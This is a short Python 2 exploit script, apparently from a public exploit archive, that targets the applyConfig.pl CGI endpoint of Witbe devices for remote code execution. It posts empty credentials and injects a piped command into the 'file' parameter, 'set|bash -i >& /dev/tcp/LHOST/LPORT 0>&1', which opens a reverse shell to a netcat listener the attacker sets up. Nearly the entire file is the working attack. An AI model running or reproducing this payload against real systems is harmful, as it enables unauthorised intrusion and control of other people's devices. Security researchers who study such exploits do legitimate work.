#!/usr/bin/python
# Exploit Title: Witbe RCE (Remote Code Execution)
# Exploit Author: BeLmar
# Date: 05/10/2016
# DEMO : https://youtu.be/ooUFXfUfIs0
# Contact : hb.mz093@gmail.com
# Vendor Homepage: http://www.witbe.net
# Tested on: Windows7/10 & BackBox
# Category: Remote Exploits

import urllib
import urllib2
import os

print " M    MW    M  M  XXMMrX, 2Mr72S   MW7XS"                             
print " MM   MM   M2  M    SM    MM   MM  M    "                             
print "  M  M ZM  M   M    XM    MMir0M   MMrXS"                              
print "  MM M  M M:   M    SM    MM   ZM  M2   "                             
print "   MMa  MMM    M    ZM    MM   XM  M    "                              
print "   XM    M     M    iM    8MZ8W8   MM8BB" 
print "             EXPLOIT BY BELMAR          "
print ""

print "Run NetCat Listner" # First Run Netcat Listner 

rhost = raw_input('RHOST: ')
lhost = raw_input('LHOST: ')
lport = raw_input('LPORT: ')

url = 'http://'+rhost+'/cgi-bin/applyConfig.pl'
user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36'
values = {'auth_login': '', #Leave it as it is
          'auth_pwd': '',   #Leave it as it is
          'file': 'set|bash -i >& /dev/tcp/'+lhost+'/'+lport+' 0>&1' }

data = urllib.urlencode(values)
req = urllib2.Request(url, data)
response = urllib2.urlopen(req)
the_page = response.read()